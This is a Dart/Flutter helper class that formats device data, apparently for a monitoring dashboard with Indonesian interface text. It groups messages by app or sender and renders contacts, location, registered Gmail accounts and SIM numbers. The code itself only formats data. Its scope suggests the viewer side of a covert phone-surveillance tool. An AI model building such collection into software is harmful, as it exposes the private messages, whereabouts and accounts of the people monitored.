import 'package:intl/intl.dart';

abstract final class DevicePayload {
  static Map<String, List<Map<String, dynamic>>> groupConversations(List<Map<String, dynamic>> raw) {
    final grouped = <String, List<Map<String, dynamic>>>{};

    for (final item in raw) {
      final nested = item['messages'];
      if (nested is List) {
        final key = item['appName']?.toString() ?? item['pkg']?.toString() ?? 'Unknown';
        final msgs = nested
            .whereType<Map>()
            .map((m) => Map<String, dynamic>.from(m))
            .map(
              (m) => {
                'title': m['title'] ?? m['address'] ?? key,
                'body': m['text'] ?? m['body'] ?? '',
                'date': formatTimestamp(m['time'] ?? m['date']),
              },
            )
            .toList();
        grouped[key] = msgs;
      } else {
        final key = item['address']?.toString() ??
            item['from']?.toString() ??
            item['title']?.toString() ??
            'Unknown';
        grouped.putIfAbsent(key, () => []).add({
          'title': key,
          'body': item['body'] ?? item['text'] ?? '',
          'date': formatTimestamp(item['date'] ?? item['time']),
        });
      }
    }

    return grouped;
  }

  static String formatTimestamp(dynamic value) {
    if (value == null) return '';
    if (value is String && value.isNotEmpty) return value;
    final ms = value is num ? value.toInt() : int.tryParse(value.toString());
    if (ms == null) return value.toString();
    final dt = DateTime.fromMillisecondsSinceEpoch(ms);
    return DateFormat('dd MMM yyyy · HH:mm').format(dt);
  }

  static String contactLine(Map<String, dynamic> contact) {
    final name = contact['name']?.toString() ?? '-';
    final number = contact['number']?.toString() ?? contact['phone']?.toString() ?? '';
    return number.isEmpty ? name : '$name · $number';
  }

  static String locationLine(Map<String, dynamic> loc) {
    final address = loc['fullAddress']?.toString() ?? loc['address']?.toString();
    if (address != null && address.isNotEmpty) return address;
    final lat = loc['lat'];
    final lng = loc['lng'];
    if (lat != null && lng != null) return 'Lat $lat · Lng $lng';
    return loc['error']?.toString() ?? 'Lokasi tidak tersedia';
  }

  static String gmailSummary(Map<String, dynamic>? data) {
    if (data == null) return 'Belum ada data Gmail';
    if (data['error'] != null) return data['error'].toString();
    final google = (data['accounts'] as List?)?.whereType<Map>().map(Map<String, dynamic>.from).toList() ?? [];
    final others = (data['others'] as List?)?.whereType<Map>().map(Map<String, dynamic>.from).toList() ?? [];
    if (google.isEmpty && others.isEmpty) return 'Tidak ada akun terdaftar';
    final lines = <String>[
      ...google.map((a) => a['email']?.toString() ?? '').where((e) => e.isNotEmpty),
      ...others.map((a) => '${a['email']} (${a['type']})').where((e) => e.isNotEmpty),
    ];
    return lines.join('\n');
  }

  static String phoneSummary(Map<String, dynamic>? data) {
    if (data == null) return 'Belum ada data SIM';
    if (data['error'] != null) return data['error'].toString();
    final sims = (data['sims'] as List?)?.whereType<Map>().map(Map<String, dynamic>.from).toList() ?? [];
    if (sims.isEmpty) return 'Tidak ada nomor SIM terbaca';
    return sims
        .map((s) {
          final slot = s['displayName'] ?? 'SIM ${((s['slot'] as num?)?.toInt() ?? 0) + 1}';
          final number = s['number']?.toString() ?? '-';
          final operator = s['operator']?.toString();
          return operator == null || operator.isEmpty ? '$slot: $number' : '$slot: $number ($operator)';
        })
        .join('\n');
  }
}